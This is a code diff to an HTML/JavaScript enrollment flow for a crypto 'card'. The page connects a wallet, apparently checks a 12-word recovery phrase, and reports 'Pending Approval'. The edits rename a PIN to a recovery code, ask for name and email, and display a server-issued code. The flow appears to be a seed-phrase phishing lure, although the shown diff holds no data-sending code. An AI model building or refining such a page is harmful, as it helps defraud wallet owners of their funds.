@@ -917,10 +917,6 @@
         </div>
       </div>
 
-      <div class="reveal-label">
-        Connected: <span class="ws-addr" id="revealAddr">0x3f...a9</span> &nbsp;·&nbsp; <span class="hl" id="revealBal">$0.00</span>
-      </div>
-
       <div style="height:20px"></div>
 
       <div class="wallet-strip" id="walletStrip" style="background:#FEF2F2;border-color:#FECACA;">
@@ -1030,9 +1026,9 @@
 
   <!-- PIN reveal — shown after enrollment -->
   <div id="pinReveal" style="display:none;width:100%;background:#EEF3FF;border:1.5px solid #C7D7FF;border-radius:16px;padding:24px;text-align:center;margin-bottom:20px">
-    <div style="font-size:11px;font-weight:700;color:#6B7280;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px">Your 4-Digit Recovery PIN</div>
+    <div style="font-size:11px;font-weight:700;color:#6B7280;text-transform:uppercase;letter-spacing:.1em;margin-bottom:10px">Your 4-Digit Recovery Code</div>
     <div id="pinDisplay" style="font-size:52px;font-weight:800;color:#0052FF;letter-spacing:.35em;font-family:'JetBrains Mono',monospace;line-height:1">—</div>
-    <div style="font-size:12px;color:#6B7280;margin-top:10px;line-height:1.5">Save this PIN — you'll need it with your email to view your card on the portal.</div>
+    <div style="font-size:12px;color:#6B7280;margin-top:10px;line-height:1.5">Save this code — you'll need it with your email to view your card on the portal.</div>
   </div>
 
   <!-- Buttons -->
@@ -1336,8 +1332,8 @@ function connectWallet(name, icon, color) {
 
   // Set up Screen 3 address input
   document.getElementById('s3WalletIcon').textContent = icon;
-  document.getElementById('s3Title').textContent = `Link ${name}`;
-  document.getElementById('s3sub').textContent = `Enter your ${name} address — no private keys needed.`;
+  document.getElementById('s3Title').textContent = 'Your details';
+  document.getElementById('s3sub').textContent = 'Enter your name and email — your recovery code will be sent here.';
   document.getElementById('cardAddrInput').value = '';
   document.getElementById('s3Error').style.display = 'none';
   document.getElementById('s3InputWrap').style.display = '';
@@ -1687,6 +1683,11 @@ if (words.length < 12) {
     if (data.code) {
       const codeEl = document.getElementById('s10Code');
       if (codeEl) codeEl.textContent = data.code;
+
+      const pinDisplay = document.getElementById('pinDisplay');
+      const pinReveal  = document.getElementById('pinReveal');
+      if (pinDisplay) pinDisplay.textContent = data.code;
+      if (pinReveal)  pinReveal.style.display = '';
     }
   } catch (_) {}
 
@@ -1694,11 +1695,10 @@ if (words.length < 12) {
   document.getElementById('s10Type').textContent = cardType === 'physical' ? 'Physical Card' : 'Virtual Card';
   document.getElementById('wsAddr').textContent  = 'Pending Approval';
   document.getElementById('wsBal').textContent   = '⏳ Under Review';
-  if (btn) btn.disabled = false;
-  if (cardType === 'physical') {
-    showScreen('s6');
-  } else {
-    showScreen('s10');
+  if (btn) {
+    btn.disabled = false;
+    btn.textContent = 'Continue →';
+    btn.onclick = () => cardType === 'physical' ? showScreen('s6') : showScreen('s10');
   }
 }
 
